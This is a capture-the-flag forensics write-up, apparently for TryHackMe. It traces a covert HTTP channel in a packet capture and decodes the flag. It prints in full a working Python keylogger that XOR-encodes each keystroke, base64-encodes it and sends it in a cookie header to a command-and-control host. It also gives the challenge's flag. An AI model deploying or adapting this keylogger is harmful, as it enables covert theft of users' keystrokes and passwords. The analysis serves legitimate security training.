# Packed Light — TryHackMe Forensics Writeup

**Category:** Forensics
**Difficulty:** Easy
**Points:** 60

## Challenge Brief

> Tiny packets. Odd hours. Suspiciously regular. Someone's smuggling out the data equivalent of a hotel towel every night, folded neatly inside traffic that looks ordinary until you decode it.
>
> A short capture from the guest network is all VERA could pull before the connection dropped. Somewhere in that traffic, a quiet little errand is running on a loop, and it isn't part of any service the hotel actually offers.

We're given a single capture file, `traffic.pcapng`, and asked to:
1. Find the covert channel.
2. Locate and reassemble the exfiltrated data.
3. Decode it and submit the flag.

## Initial Triage

Loading the capture with Scapy and breaking it down by protocol gives a quick sense of scale:

| Protocol | Packets |
|---|---|
| TCP | 1116 |
| UDP | 211 |
| DNS | 18 |

The DNS queries (`mobile.events.data.microsoft.com`, `search.brave.com`, `optimizationguide-pa.googleapis.com`) are all mundane background noise from a normal desktop — nothing hidden there. The non-DNS UDP traffic resolves to QUIC/HTTP3 sessions on port 443 to legitimate-looking CDN ranges, plus SSDP multicast discovery — also normal.

The interesting signal shows up when the TCP flows are sorted by packet count. Buried among a handful of large HTTPS sessions is a long, repetitive run of **short-lived connections to `34.41.103.191:8080`** — an unencrypted, non-standard port, hit over and over in quick succession. That matches the brief's description of something "suspiciously regular" running "on a loop."

## Finding the Backdoor

Reassembling the very first TCP stream to port 8080 reveals a plaintext HTTP exchange:

```
GET /temp/updates.py HTTP/1.1
Host: byte-lotus-hotel.thm:8080
...
```

The server — a bare Python `SimpleHTTP/0.6` instance — responds with the full source of `updates.py`:

```python
import requests
import base64
from pynput import keyboard

C2_URL = "http://byte-lotus-hotel.thm:8080/"

def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def sendltr(character):
    raw_bytes = character.encode('utf-8')
    encrypted = xor(raw_bytes, getkey().encode('utf-8'))
    b64_string = base64.b64encode(encrypted).decode('utf-8')

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
        "Cookie": f"hotel_sess_state={b64_string}"
    }
    try:
        requests.get(C2_URL, headers=headers, timeout=0.5)
    except:
        pass

def on_press(key):
    try:
        sendltr(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            sendltr(" ")
        elif key == keyboard.Key.enter:
            sendltr("\n")

print("[*] Byte Lotus Sync Service started...")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

This is a keylogger disguised as a "sync service." Its exfil mechanism is exactly the "hotel towel folded neatly inside traffic that looks ordinary" from the brief:

- Every keystroke is captured individually via `pynput`.
- Each character is XOR'd with the key `H0t3lSt@ff0Nly` + `K3epS3cr3t!`.
- The result is base64-encoded and stuffed into a `Cookie: hotel_sess_state=...` header.
- A fresh, otherwise-unremarkable `GET /` request is fired off to the C2 host for **every single keystroke** — which is why the capture is full of dozens of near-identical, one-off connections to port 8080.

## Reassembling the Exfiltrated Data

Since one keystroke = one TCP connection, the process is:

1. Reassemble every TCP stream destined for `34.41.103.191:8080`.
2. Pull the `hotel_sess_state` cookie value out of each `GET` request.
3. Sort the connections by their **first packet timestamp** (connection order = typing order).
4. Base64-decode each cookie value, then XOR it against the recovered key.
5. Concatenate the decoded characters back into the original typed string.

```python
from scapy.all import rdpcap, IP, TCP, Raw
import re, base64

pkts = rdpcap('traffic.pcapng')

streams, times = {}, {}
for p in pkts:
    if p.haslayer(TCP) and p.haslayer(IP) and p.haslayer(Raw):
        key = (p[IP].src, p[IP].dst, p[TCP].sport, p[TCP].dport)
        streams.setdefault(key, b'')
        streams[key] += p[Raw].load
        times.setdefault(key, float(p.time))

cookies = []
for key, data in streams.items():
    if key[1] == '34.41.103.191' and key[3] == 8080:
        m = re.search(rb'Cookie: hotel_sess_state=([A-Za-z0-9+/=]+)', data)
        if m:
            cookies.append((times[key], m.group(1).decode()))

cookies.sort()

def xor(data, key):
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

k = ("H0t3lSt@ff0Nly" + "K3epS3cr3t!").encode()

result = ''.join(
    xor(base64.b64decode(c), k).decode('utf-8')
    for _, c in cookies
)
print(result)
```

30 keystroke connections were recovered in total.

## Result

Decoding and concatenating every keystroke in capture order reconstructs the flag directly — it was typed out one character at a time, live, over the covert channel:

```
THM{V3r4_1s_w4tch1ng_0veR_y0u}
```

## Summary

| Step | Finding |
|---|---|
| Covert channel | Repeated short-lived HTTP connections to `34.41.103.191:8080` (`byte-lotus-hotel.thm`) |
| Payload delivery | `GET /temp/updates.py` served a `pynput`-based keylogger from a fake "Byte Lotus Sync Service" |
| Exfil method | One keystroke → XOR (`H0t3lSt@ff0Nly` + `K3epS3cr3t!`) → base64 → smuggled in the `Cookie: hotel_sess_state` header of a throwaway GET request |
| Reassembly | Order connections by timestamp, decode each cookie, concatenate |
| Flag | `THM{V3r4_1s_w4tch1ng_0veR_y0u}` |

**Lesson:** encoding data into HTTP headers (cookies, User-Agent, etc.) of otherwise-normal-looking requests is a classic low-and-slow exfiltration technique — each individual request is tiny and unremarkable, but the *pattern* (many near-identical connections, fired at typing speed, to an unusual port) is the tell.
